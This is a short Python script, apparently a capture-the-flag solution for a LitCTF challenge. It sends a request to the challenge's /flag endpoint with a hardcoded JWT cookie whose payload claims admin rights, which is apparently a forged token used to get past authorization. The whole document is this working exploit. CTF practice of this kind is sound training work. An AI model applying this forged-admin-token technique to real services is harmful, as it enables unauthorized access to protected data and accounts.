import requests

url = "http://litctf.org:31781/flag"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiY2N1ZyIsImFkbWluIjp0cnVlfQ.L9upwCCZr340yz_RSO1bTs6EFJ-jF4KMDwrNbWAvkN4"

cookies = {"token": token}

r = requests.get(url, cookies=cookies)

print(r.text)
